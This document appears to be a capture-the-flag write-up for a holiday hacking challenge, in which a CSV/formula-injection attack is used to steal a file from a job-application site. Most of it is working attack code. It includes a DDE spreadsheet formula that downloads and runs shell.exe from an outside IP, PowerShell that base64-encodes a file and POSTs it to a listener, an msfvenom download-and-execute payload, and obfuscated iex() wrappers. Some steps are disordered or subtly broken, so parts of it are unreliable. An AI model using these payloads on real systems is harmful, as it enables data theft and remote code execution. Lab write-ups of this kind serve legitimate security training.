# 7. HR Incident Response
> Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

1. Build a server to receive the POSTed file.
2. Test a payload to upload a file.
3. Use scripts/csv_injection Docker-compose project.
4. Start the node server: `docker-compose up nodeserver`
5. Use this payload to test:
```
echo "123123" > content.txt
$uri = "http://172.17.0.3:8084/"
$FileName="content.txt"

$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)

$uri = $uri + "?data="+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST
```

6. Node side, you should receive `MQAyADMAMQAyADMA`; and then
```bash
echo "MQAyADMAMQAyADMA" | base64 -d
123123 <<< You've exfiltrated a file!
```







7. Using the example below, write a new payload:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://192.168.0.8:8/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```

Which will look similar to this:
```bash
Invoke-RestMethod -uri http://www.nmac.com.ar/top_notch_uploader.php -Method Post -Infile /bin/ls

```






7. Get Metasploit and run the Docker MSFVenom:
```bash
sudo chown $(id -u) ~/.msf4;
git clone git@github.com:rapid7/metasploit-framework.git
cd metasploit-framework;
docker-compose run --rm --no-deps -e MSF_UID=$(id -u) -e MSF_GID=$(id -g) ms ./msfvenom --list payload
```

We'll use the `cmd/windows/download_eval_vbs` payload to download a VBScript file which will be executed.
Such VBscript file will send us the file we need.

List the possible formats `docker-compose run --rm --no-deps -e MSF_UID=$(id -u) -e MSF_GID=$(id -g) ms ./msfvenom --list payload`, we'll use `powershell`.

With that info, see which options are required:

```bash
docker-compose run --rm --no-deps -e MSF_UID=$(id -u) -e MSF_GID=$(id -g) ms ./msfvenom --payload cmd/windows/download_eval_vbs --format powershell --list-options
[...]
Basic options:
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
DELETE          false            yes       Delete created .vbs after download
INCLUDECMD      false            yes       Include the cmd /q /c
INCLUDEWSCRIPT  false            yes       Include the wscript command
URL                              yes       The pre-encoded URL to the script

[...]
```

So run the command with options `DELETE=false INCLUDECMD=true URL=http://172.17.0.3:8084/script.ps1` as follows:
```
docker-compose run --rm --no-deps -e MSF_UID=$(id -u) -e MSF_GID=$(id -g) ms ./msfvenom --payload cmd/windows/download_eval_vbs --format powershell DELETE=false INCLUDECMD=true URL=http://172.17.0.3:8084/script.ps1
```



Build a PowerShell payload which will open a remote server


7. Convert the payload to Base64:
```bash
echo '$uri = "http://172.17.0.3:8084/"
$FileName="content.txt"

$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)

$uri = $uri + "?data="+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST' | base64 -e

JHVyaSA9ICJodHRwOi8vMTcyLjE3LjAuMzo4MDg0LyIKJEZpbGVOYW1lPSJjb250ZW50LnR4dCIK
CiREYXRhID0gZ2V0LWNvbnRlbnQgJEZpbGVOYW1lCiRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNv
ZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJERhdGEpCiRFbmNvZGVkRGF0YSA9IFtDb252ZXJ0XTo6
VG9CYXNlNjRTdHJpbmcoJEJ5dGVzKQoKJHVyaSA9ICR1cmkgKyAiP2RhdGE9IiskRW5jb2RlZERh
dGEKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJpIC1NZXRob2QgUE9TVAo=
```

8. Try running it in PowerShell:

```bash

a=IO.StreamReader(
  [Convert]::FromBase64String("JHVyaSA9ICJodHRwOi8vMTcyLjE3LjAuMzo4MDg0LyIKJEZpbGVOYW1lPSJjb250ZW50LnR4dCIKCiREYXRhID0gZ2V0LWNvbnRlbnQgJEZpbGVOYW1lCiRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJERhdGEpCiRFbmNvZGVkRGF0YSA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEJ5dGVzKQoKJHVyaSA9ICR1cmkgKyAiP2RhdGE9IiskRW5jb2RlZERhdGEKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJpIC1NZXRob2QgUE9TVAo="),
  [Text.Encoding]::ASCII
)

pwsh -c '[Convert]::FromBase64String("JHVyaSA9ICJodHRwOi8vMTcyLjE3LjAuMzo4MDg0LyIKJEZpbGVOYW1lPSJjb250ZW50LnR4dCIKCiREYXRhID0gZ2V0LWNvbnRlbnQgJEZpbGVOYW1lCiRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJERhdGEpCiRFbmNvZGVkRGF0YSA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEJ5dGVzKQoKJHVyaSA9ICR1cmkgKyAiP2RhdGE9IiskRW5jb2RlZERhdGEKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJpIC1NZXRob2QgUE9TVAo=")'






7. Convert the payload to something that can be injected:

```
pwsh -c '$uri = \"http://172.17.0.3:8084/\"
$FileName=\"content.txt\"
$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)
$uri = $uri + \"?data=\"+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST'
```

All the above needs to be ran by the shell. Move the payload to a variable (with proper escaping) and then invoke iex() to execute it:

```
pwsh -c "$A=\"$uri = 'http://172.17.0.3:8084/'
$FileName=\"content.txt\"
$Data = get-content $FileName
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
$EncodedData = [Convert]::ToBase64String($Bytes)
$uri = $uri + \"?data=\"+$EncodedData
Invoke-WebRequest -Uri $uri -Method POST
iex($A)\""
```
